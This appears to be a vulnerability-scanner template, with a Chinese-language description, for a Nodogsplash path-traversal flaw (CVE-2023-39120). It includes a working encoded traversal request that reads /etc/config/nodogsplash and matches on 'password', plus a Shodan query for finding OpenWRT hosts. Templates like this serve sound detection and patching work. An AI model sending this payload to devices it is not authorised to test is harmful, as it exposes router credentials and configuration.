id: nodogsplash-lfi

info:
  name: Nodogsplash - 目录遍历漏洞（CVE-2023-39120）
  author: Numan Türle
  severity: high
  description: |-
    Nodogsplash 存在安全漏洞。攻击者可通过 /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash 读取服务器上的敏感文件，导致配置、凭据或业务数据暴露。该模板通过请求 /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash，并结合响应中的 nodogsplash、password、application/octet-stream 等特征进行验证。
  impact: |-
    - 攻击者可通过路径穿越访问非预期目录中的文件，暴露系统配置、日志或凭据。
    - 若与其他缺陷结合，漏洞还可能成为进一步读取敏感信息或执行代码的前置条件。
  remediation: |-
    - 尽快将 Nodogsplash 升级到厂商已发布的修复版本，并结合官方公告核对受影响版本范围。
    - 对路径参数进行规范化处理并拒绝 ../ 等穿越特征，确保访问范围始终限制在预期目录内。
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-39120
    - https://github.com/nodogsplash/nodogsplash/commit/a745a5d635925d2a6f0e0530bdc0eac645b672ed
    - https://gist.github.com/numanturle/55cb758bacc4930a081e79c2a6a769b6
    - https://github.com/openwrt/routing/pull/997
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"OpenWRT"
  tags: lfi,openwrt,nodogsplash,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/config/nodogsplash"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "nodogsplash"
          - "password"
        condition: and

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
